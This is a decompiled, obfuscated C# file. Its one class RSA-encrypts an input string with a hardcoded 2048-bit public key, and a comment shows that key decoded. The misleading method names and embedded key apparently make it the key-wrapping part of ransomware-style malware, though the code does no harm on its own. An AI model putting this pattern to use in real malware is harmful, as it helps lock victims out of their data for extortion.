using System;
using System.Security.Cryptography;
using System.Text;

namespace MufMaOSvGyvz
{
	// Token: 0x02000014 RID: 20
	public static class Key
	{
		// Token: 0x06000057 RID: 87
		public static string GetMasterKey(string string_0)
		{
			int int_ = 0;
			string string_ = "";
			Key.GetValue(Key.dnANbLvdgOINFG, out int_, out string_);
			byte[] inArray = Key.CheckValidKey(Encoding.UTF8.GetBytes(string_0), int_, string_);
			return Convert.ToBase64String(inArray);
		}

		// Token: 0x06000058 RID: 88
		private static byte[] CheckValidKey(byte[] byte_0, int int_0, string string_0)
		{
			if (byte_0 == null || byte_0.Length == 0)
			{
				throw new ArgumentException("Data are empty", "data");
			}
			int num = Key.CheckMaxSize(int_0);
			if (byte_0.Length > num)
			{
				throw new ArgumentException(string.Format("Maximum data length is {0}", num), "data");
			}
			if (!Key.CheckSizekey(int_0))
			{
				throw new ArgumentException("Key size is not valid", "keySize");
			}
			if (string.IsNullOrEmpty(string_0))
			{
				throw new ArgumentException("Key is null or empty", "publicKeyXml");
			}
			byte[] result;
			using (RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider(int_0))
			{
				rsacryptoServiceProvider.FromXmlString(string_0);
				result = rsacryptoServiceProvider.Encrypt(byte_0, Key.kCASXJgXoytAA);
			}
			return result;
		}

		// Token: 0x06000059 RID: 89
		private static int CheckMaxSize(int int_0)
		{
			int result;
			if (Key.kCASXJgXoytAA)
			{
				result = (int_0 - 384) / 8 + 7;
			}
			else
			{
				result = (int_0 - 384) / 8 + 37;
			}
			return result;
		}

		// Token: 0x0600005A RID: 90
		private static bool CheckSizekey(int int_0)
		{
			return int_0 >= 384 && int_0 <= 16384 && int_0 % 8 == 0;
		}

		// Token: 0x0600005B RID: 91
		private static void GetValue(string BEKdDRtLICVXo, out int cUJXpyhAdido, out string RDTkeNihkmvE)
		{
			cUJXpyhAdido = 0;
			RDTkeNihkmvE = "";
			if (BEKdDRtLICVXo != null && BEKdDRtLICVXo.Length > 0)
			{
				byte[] bytes = Convert.FromBase64String(BEKdDRtLICVXo);
				string @string = Encoding.UTF8.GetString(bytes);
				if (@string.Contains("!"))
				{
					string[] array = @string.Split(new char[]
					{
						'!'
					}, 2);
					try
					{
						cUJXpyhAdido = int.Parse(array[0]);
						RDTkeNihkmvE = array[1];
					}
					catch (Exception)
					{
					}
				}
			}
		}

		// Token: 0x04000063 RID: 99
		private static bool kCASXJgXoytAA = false;

		// Token: 0x04000064 RID: 100
		private static readonly string dnANbLvdgOINFG = "MjA0OCE8UlNBS2V5VmFsdWU+PE1vZHVsdXM+clNGdWRrWmRpQkRNVVkzRnNGcDFKQXVsYWR1Y1UrNkFjK1B4Z2ZLcks1TFM5V0Z6bGhPRHZWUWVlOXB6a0JMMHlURGdFSkUzMDRwd3RnK1c1WjVaZ29SaUdJL2owdnhuYlNxRUNHV3E2bzBMUmRxMTRVL3ZoT1hncW1xR2xrSkxRVldPb2MyKzZsYlh6OEw4TXZqaTNKc3BmTXZ5WnNFZyt1R1h3aTd3QXlyRnhCbzU2NEtqL2Y1b3NFWHFicm9obTdUci90S3FINE9aSm85VjJvYmF3b0ZEMHdyWHdvTlpUc0t3S2diWTFHdXdhVXpQYk1NMEJsdFZVdS8zN0V5UFYySnVYcFZybHZXYVowSVFnMzhGeFFvL3BsamYzMHlDdWh3Nmd1VEtaaVRJU0dHMW5rdzE5TlQyaS91TjFHQWRPTWFlVUhJY1FSeEZDcE8wczdSZEFRPT08L01vZHVsdXM+PEV4cG9uZW50PkFRQUI8L0V4cG9uZW50PjwvUlNBS2V5VmFsdWU+";
		// -> 2048!<RSAKeyValue><Modulus>rSFudkZdiBDMUY3FsFp1JAuladucU+6Ac+PxgfKrK5LS9WFzlhODvVQee9pzkBL0yTDgEJE304pwtg+W5Z5ZgoRiGI/j0vxnbSqECGWq6o0LRdq14U/vhOXgqmqGlkJLQVWOoc2+6lbXz8L8Mvji3JspfMvyZsEg+uGXwi7wAyrFxBo564Kj/f5osEXqbrohm7Tr/tKqH4OZJo9V2obawoFD0wrXwoNZTsKwKgbY1GuwaUzPbMM0BltVUu/37EyPV2JuXpVrlvWaZ0IQg38FxQo/pljf30yCuhw6guTKZiTISGG1nkw19NT2i/uN1GAdOMaeUHIcQRxFCpO0s7RdAQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>
	}
}
